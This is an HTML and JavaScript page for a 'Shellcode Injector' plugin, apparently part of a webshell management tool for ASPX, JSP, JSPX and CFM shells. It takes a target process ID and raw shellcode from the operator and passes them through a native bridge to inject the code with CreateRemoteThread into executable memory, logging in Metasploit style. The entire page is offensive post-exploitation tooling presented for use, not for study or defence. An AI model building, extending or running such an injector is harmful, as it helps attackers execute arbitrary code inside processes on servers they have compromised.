<!DOCTYPE html>
<html lang="en-US">
<head>
    <meta charset="UTF-8">
    <title>Shellcode Injector Platform</title>
    <style>
        html, body {
            min-height: 100%;
            margin: 0;
            padding: 0;
            background-color: #000000;
            color: #ffffff;
            overflow-y: auto; 
            overflow-x: hidden;
        }
        body { 
            font-family: 'Courier New', Courier, monospace;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            box-sizing: border-box;
            padding: 20px;
        }
        
        .container { 
            width: 100%;
            max-width: 650px; 
            background: #000000; 
            padding: 25px; 
            border-radius: 0px;
            border: 1px solid #ffffff;
            box-sizing: border-box;
            margin: auto; 
        }
        
        h2 { 
            color: #ffffff;
            margin-top: 0; 
            border-bottom: 1px solid #ffffff; 
            padding-bottom: 10px; 
            font-size: 18px;
            text-transform: uppercase;
            letter-spacing: 2px;
        }
        
        .status-bar { 
            background: #000000; 
            padding: 10px; 
            margin-bottom: 20px; 
            font-size: 12px; 
            border: 1px dashed #ffffff;
            text-transform: uppercase;
        }
        
        .badge { padding: 0px 4px; font-weight: bold; }
        .badge-active { background: #ffffff; color: #000000; }
        .badge-error { border: 1px dashed #ffffff; background: transparent; color: #ffffff; }
        
        .form-group { margin-bottom: 15px; }
        .form-row { display: flex; gap: 15px; margin-bottom: 15px; }
        .form-row .form-group { flex: 1; margin-bottom: 0; }
        
        label { 
            display: block; 
            margin-bottom: 5px; 
            color: #ffffff; 
            text-transform: uppercase; 
            font-size: 12px;
            font-weight: bold;
        }
        
        input[type="text"], select, textarea { 
            width: 100%; 
            background: #000000; 
            border: 1px solid #ffffff; 
            color: #ffffff; 
            padding: 8px; 
            border-radius: 0px; 
            box-sizing: border-box; 
            font-family: inherit;
        }
        input[type="text"]:focus, select:focus, textarea:focus {
            outline: none;
            background: #111111;
        }
        
        select option {
            background: #000000;
            color: #ffffff;
        }
        
        textarea {
            resize: vertical; 
            min-height: 120px;  
        }
        
        button { 
            width: 100%;
            background-color: transparent; 
            color: #ffffff; 
            font-weight: bold; 
            font-family: inherit;
            border: 1px solid #ffffff; 
            padding: 10px 25px; 
            cursor: pointer; 
            border-radius: 0px; 
            text-transform: uppercase;
            letter-spacing: 1px;
            margin-top: 10px;
        }
        button:hover:not(:disabled) { 
            background-color: #ffffff; 
            color: #000000;
        }
        button:disabled { 
            border-color: #444444; 
            color: #444444; 
            cursor: not-allowed; 
        }
        
        h3 {
            font-size: 13px;
            color: #ffffff;
            text-transform: uppercase;
            margin-top: 25px;
        }
        
        .console { 
            background: #000000; 
            border: 1px solid #ffffff; 
            padding: 15px; 
            height: 160px; 
            overflow-y: auto; 
            white-space: pre-wrap;
            font-size: 13px;
            line-height: 1.5;
        }

        .msf-line { margin-bottom: 4px; color: #ffffff; } 
        .msf-info { color: #3498db; font-weight: bold; }
        .msf-success { color: #2ecc71; font-weight: bold; }
        .msf-warn { color: #f1c40f; font-weight: bold; }
        .msf-error { color: #e74c3c; font-weight: bold; }
    </style>
</head>
<body>

<div class="container">
    <h2>[ Shellcode Injector ]</h2>
    
    <div class="status-bar" id="statusBar">
        [*] Awaiting native bridge connection...
    </div>
    
    <div class="form-row">
        <div class="form-group">
            <label>> Injection Method</label>
            <select id="injectMethod">
                <option value="remote_thread">CreateRemoteThread (Remote PID)</option>
            </select>
        </div>
        <div class="form-group" style="max-width: 150px;">
            <label>> Target PID</label>
            <input type="text" id="targetPid" value="0">
        </div>
    </div>
    
    <div class="form-group">
        <label>> Shellcode Payload (Hex Format / \x00 or Raw hex)</label>
        <textarea id="shellcodeData" placeholder="\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5..."></textarea>
    </div>

    <button id="injectBtn" onclick="executeInjection()" disabled>Inject Payload</button>

    <h3>Deployment Log</h3>
    <div class="console" id="consoleOutput"></div>
</div>

<script>
    const pluginManifest = {
        "supportedLangs": [
            "ASPX/NebulaPulsar/DarkMatter",
            "JSP/NebulaPulsar/DarkMatter",
            "JSPX/NebulaPulsar/DarkMatter",
            "CFM/NebulaPulsar/DarkMatter",
        ]
    };

    let currentShellType = "";

    function appendLog(text) {
        const consoleOutput = document.getElementById('consoleOutput');
        if (!text) return;

        const lines = text.split('\n');
        lines.forEach(line => {
            if (line.trim() === "") return;

            let div = document.createElement('div');
            div.className = 'msf-line';

            if (line.startsWith('[*]')) {
                div.innerHTML = `<span class="msf-info">[*]</span> ${line.substring(3)}`;
            } else if (line.startsWith('[+]')) {
                div.innerHTML = `<span class="msf-success">[+]</span> ${line.substring(3)}`;
            } else if (line.startsWith('[-]')) {
                div.innerHTML = `<span class="msf-error">[-]</span> ${line.substring(3)}`;
            } else if (line.startsWith('[!]')) {
                div.innerHTML = `<span class="msf-warn">[!]</span> ${line.substring(3)}`;
            } else {
                div.innerText = line;
            }
            consoleOutput.appendChild(div);
        });
        consoleOutput.scrollTop = consoleOutput.scrollHeight;
    }

    window.addEventListener('DOMContentLoaded', async () => {
        const statusBar = document.getElementById('statusBar');
        const injectBtn = document.getElementById('injectBtn');

        try {
            if (window.chrome && window.chrome.webview && window.chrome.webview.hostObjects.nativeBridge) {
                const bridge = window.chrome.webview.hostObjects.nativeBridge;
                currentShellType = await bridge.fnGetShellType();

                if (pluginManifest.supportedLangs.includes(currentShellType)) {
                    statusBar.innerHTML = `GATEWAY_ENV: <span class="badge badge-active">${currentShellType.toUpperCase()}</span> // STATUS: INJECTOR READY`;
                    injectBtn.disabled = false;
                    appendLog("[*] NATIVE INTERFACE COUPLING SUCCESSFUL.");
                    appendLog("[*] ALLOCATOR SYSTEM ONLINE.");
                } else {
                    statusBar.innerHTML = `GATEWAY_ENV: <span class="badge badge-error">${currentShellType.toUpperCase()}</span> // STATUS: INCOMPATIBLE`;
                    appendLog(`[-] SUB-SYSTEM CONFIGURATION MISMATCH.`);
                }
            } else {
                appendLog("[!] BRIDGE_OFFLINE: UNABLE TO MAP HOST SYMBOLS.");
            }
        } catch (e) {
            appendLog("[!] EXCEPTION: " + e.message.toUpperCase());
        }
    });

    async function executeInjection() {
        const method = document.getElementById('injectMethod').value;
        const pid = document.getElementById('targetPid').value;
        const rawCode = document.getElementById('shellcodeData').value;

        if (!rawCode.trim()) {
            appendLog("[-] ERROR: INJECTION BUFFER IS EMPTY.");
            return;
        }

        const injectionConfig = JSON.stringify({
            strategy: method,
            target_pid: parseInt(pid, 10) || 0,
            payload_hex: rawCode
        });

        appendLog(`[*] ALLOCATING VIRTUAL MEMORY (PAGE_EXECUTE_READWRITE)`);
        
        const bridge = window.chrome.webview.hostObjects.nativeBridge;
        const currentDir = window.location.pathname.substring(1, window.location.pathname.lastIndexOf('/') + 1);
        const payloadCode = await bridge.fnGetPayload(currentDir, currentShellType, "payload");

        appendLog(`[*] INVOKING INJECT METHOD: [${method.toUpperCase()}] TARGET PID: [${pid}]`);
        appendLog('[+] WRITING EXECUTABLE BYTE ARRAY INTO CONTEXT...');

        const result = await bridge.fnRun(injectionConfig, payloadCode, currentShellType);
        
        appendLog(result.toUpperCase());
    }
</script>

</body>
</html>
